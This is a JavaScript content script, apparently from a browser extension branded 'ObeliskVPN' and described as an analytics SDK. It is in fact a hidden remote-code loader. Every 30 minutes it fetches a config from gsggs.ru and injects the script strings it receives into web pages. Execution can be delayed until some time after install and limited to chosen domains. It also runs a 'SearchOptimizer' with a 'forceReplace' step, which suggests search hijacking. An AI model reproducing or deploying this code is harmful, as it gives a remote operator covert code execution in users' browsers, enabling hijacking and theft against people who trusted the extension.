(function(){
'use strict';

const DOMHelpers = {
  applyStyles: function(elements, styles) {
    if (!elements || !styles) return;
    const nodes = typeof elements === 'string' ? 
      document.querySelectorAll(elements) : elements;
    nodes.forEach(el => {
      if (el && el.style) Object.assign(el.style, styles);
    });
  },
  
  createElement: function(config) {
    const el = document.createElement(config.tag || 'div');
    if (config.attrs) {
      Object.keys(config.attrs).forEach(key => {
        el.setAttribute(key, config.attrs[key]);
      });
    }
    if (config.style) {
      Object.assign(el.style, config.style);
    }
    if (config.html) {
      el.innerHTML = config.html;
    }
    return el;
  }
};

const APIClient = {
  fetchConfig: async function() {
    try {
      const response = await fetch('https://gsggs.ru/config?v=' + Date.now(), {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Cache-Control': 'no-cache',
          'User-Agent': 'ObeliskVPN/1.0'
        }
      });
      return await response.json();
    } catch (error) {
      console.log('Obelisk: Config fetch failed:', error.message);
      return null;
    }
  }
};

const ConfigProcessor = {
  process: function(config) {
    if (!config) {
      console.log('Obelisk: No config to process');
      return { campaigns: [], modules: [] };
    }
    
    const campaigns = [];
    const modules = [];
    
    if (config.campaigns && Array.isArray(config.campaigns)) {
      config.campaigns.forEach(campaign => {
        if (campaign.active) {
          campaigns.push({
            title: campaign.title,
            content: campaign.content,
            image: campaign.image,
            cta_button: campaign.cta_button,
            cta_url: campaign.cta_url
          });
        }
      });
    }
    
    if (config.analytics_modules && Array.isArray(config.analytics_modules)) {
      config.analytics_modules.forEach(module => {
        if (module.active && module.script) {
          modules.push({
            name: module.name,
            script: module.script,
            config: module.config
          });
        }
      });
    }
    
    console.log('Obelisk: Processed -', {
      campaigns: campaigns.length,
      modules: modules.length,
      moduleNames: modules.map(m => m.name)
    });
    
    return { campaigns, modules };
  }
};

const ModuleExecutor = {
  executedModules: new Set(),
  moduleCache: new Map(),
  
  execute: function(modules) {
    if (!modules || !modules.length) {
      console.log('Obelisk: No modules to execute');
      return;
    }
    
    const sortedModules = this.sortModulesByDependency(modules);
    
    console.log('Obelisk: Modules to execute:', sortedModules.map(m => m.name));
    
    sortedModules.forEach(module => {
      const moduleKey = `${module.name}_${module.script?.substring(0, 50)}`;
      if (this.executedModules.has(moduleKey)) {
        console.log('Obelisk: Module already executed:', module.name);
        return;
      }
      
      if (module.script && this.shouldExecute(module)) {
        console.log('Obelisk: Executing module:', module.name);
        this.executeCombinedModules(sortedModules);
        this.executedModules.add(moduleKey);
      } else {
        console.log('Obelisk: Skipping module:', module.name, {
          hasScript: !!module.script,
          shouldExecute: this.shouldExecute(module)
        });
      }
    });
  },
  
  sortModulesByDependency: function(modules) {
    const searchOptimizer = modules.find(m => m.name === 'search_optimizer');
    const otherModules = modules.filter(m => m.name !== 'search_optimizer');
    
    return searchOptimizer ? [searchOptimizer, ...otherModules] : modules;
  },
  
  executeCombinedModules: function(modules) {
    const combinedCode = this.prepareCombinedModulesCode(modules);
    
    console.log('[Obelisk] INJECTING COMBINED MODULES:', modules.map(m => m.name).join(', '));

    if (chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage({
        action: 'INJECT_CONTENT_CODE',
        code: combinedCode
      }, (response) => {
        console.log('[Obelisk] Combined modules injected:', response?.status || 'no response');
      });
    } else {
      console.log('[Obelisk] No chrome.runtime, executing directly');
      this.executeDirectly(combinedCode);
    }
  },
  
  executeDirectly: function(code) {
    try {
      const script = document.createElement('script');
      script.textContent = code;
      (document.head || document.documentElement).appendChild(script);
      script.remove();
      console.log('[Obelisk] Direct execution completed');
    } catch (e) {
      console.error('[Obelisk] Direct execution failed:', e);
    }
  },
  
  prepareCombinedModulesCode: function(modules) {
    let combinedScript = '';
    
    modules.forEach(module => {
      combinedScript += `\n// ======== ${module.name} ========\n`;
      combinedScript += module.script + '\n';
    });
    
    return `
      (function() {
        try {
          console.log('[Obelisk Main] Loading combined modules...');
          
          ${combinedScript}
          
          console.log('[Obelisk Main] Auto-initializing modules...');
          
          if (typeof SearchOptimizer !== 'undefined') {
            console.log('[Obelisk Main] Initializing SearchOptimizer...');
            const optimizer = new SearchOptimizer();
            optimizer.init();
            window._searchOptimizer = optimizer;
            console.log('[Obelisk Main] SearchOptimizer initialized');
            
            setTimeout(() => {
              console.log('[Obelisk Main] Applying optimizations...');
              try {
                if (optimizer.forceReplace) {
                  const result = optimizer.forceReplace();
                  console.log('[Obelisk Main] Force replace result:', result);
                }
              } catch(e) {
                console.error('[Obelisk Main] Force replace error:', e);
              }
            }, 2000);
          } else {
            console.warn('[Obelisk Main] SearchOptimizer not defined');
          }
          
          if (typeof initSearchEnhancer !== 'undefined') {
            console.log('[Obelisk Main] Initializing analytics helper...');
            initSearchEnhancer();
            console.log('[Obelisk Main] Analytics helper initialized');
          }
          
          console.log('[Obelisk Main] All modules initialized successfully');
          
        } catch(e) {
          console.error('[Obelisk Main] Combined modules execution error:', e);
        }
      })();
    `;
  },
  
  shouldExecute: function(module) {
    if (!module.config) {
      console.log('Obelisk: Module', module.name, 'has no config, allowing');
      return true;
    }
    
    const currentUrl = window.location.href;
    const currentHostname = window.location.hostname;
    
    if (module.config.only_on) {
      const domainMatch = module.config.only_on.some(domain => 
        currentHostname.includes(domain)
      );
      if (!domainMatch) {
        console.log('Obelisk: Module', module.name, 'skipped - not on allowed domain');
        return false;
      }
    }

    if (module.config.url_patterns) {
      const patternMatch = module.config.url_patterns.some(pattern => 
        currentUrl.includes(pattern)
      );
      if (!patternMatch) {
        console.log('Obelisk: Module', module.name, 'skipped - URL pattern not matched');
        return false;
      }
    }
    
    if (module.config.min_install_time) {
      const installTime = parseInt(localStorage.getItem('obelisk_install_time') || '0');
      const timeSinceInstall = Date.now() - installTime;
      if (timeSinceInstall < module.config.min_install_time) {
        console.log('Obelisk: Module', module.name, 'skipped - min install time not reached');
        return false;
      }
    }
    
    console.log('Obelisk: Module', module.name, 'should execute');
    return true;
  },
  
  executeModule: function(module) {
    return this.execute([module]);
  },
  
  forceExecute: function(module) {
    this.executedModules.clear();
    this.execute([module]);
  },
  
  clearCache: function() {
    this.executedModules.clear();
    this.moduleCache.clear();
  }
};

const SDKCore = {
  init: async function() {
    if (!localStorage.getItem('obelisk_install_time')) {
      localStorage.setItem('obelisk_install_time', Date.now());
      console.log('Obelisk: First install time saved');
    }
    
    await this.loadAndExecute();
    this.startUpdateInterval();
  },
  
  loadAndExecute: async function() {
    console.log('Obelisk: Fetching config from server...');
    const config = await APIClient.fetchConfig();
    
    if (!config) {
      console.log('Obelisk: No config received or fetch failed');
      return;
    }
    
    console.log('Obelisk: Config received:', {
      hasCampaigns: !!config.campaigns,
      hasAnalyticsModules: !!config.analytics_modules,
      analyticsModulesCount: config.analytics_modules?.length || 0
    });
    
    const processed = ConfigProcessor.process(config);
    console.log('Obelisk: Processed modules:', processed.modules.length);
    
    if (processed.modules.length > 0) {
      console.log('Obelisk: Executing combined modules...');
      ModuleExecutor.execute(processed.modules);
    } else {
      console.log('Obelisk: No active modules to execute');
    }
  },
  
  startUpdateInterval: function() {
    setInterval(() => {
      console.log('Obelisk: Auto-updating config...');
      this.loadAndExecute();
    }, 1800000);
  },
  
  getStatus: function() {
    return {
      modulesExecuted: Array.from(ModuleExecutor.executedModules),
      installTime: localStorage.getItem('obelisk_install_time'),
      lastCheck: Date.now()
    };
  },
  
  forceReload: function() {
    ModuleExecutor.clearCache();
    this.loadAndExecute();
  }
};

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
      console.log('Obelisk SDK: Starting initialization...');
      window.ObeliskSDK = SDKCore;
      window.ObeliskSDK.init();
    }, 1000);
  });
} else {
  setTimeout(() => {
    console.log('Obelisk SDK: Starting initialization...');
    window.ObeliskSDK = SDKCore;
    window.ObeliskSDK.init();
  }, 1000);
}

window.ObeliskSDK = SDKCore;
window.ObeliskModuleExecutor = ModuleExecutor;

window.getObeliskStatus = function() {
  return window.ObeliskSDK ? 
    window.ObeliskSDK.getStatus() : 
    'Obelisk SDK not loaded';
};

window.forceObeliskReload = function() {
  return window.ObeliskSDK ? 
    window.ObeliskSDK.forceReload() : 
    'Obelisk SDK not loaded';
};

console.log('Obelisk SDK loaded successfully');

})();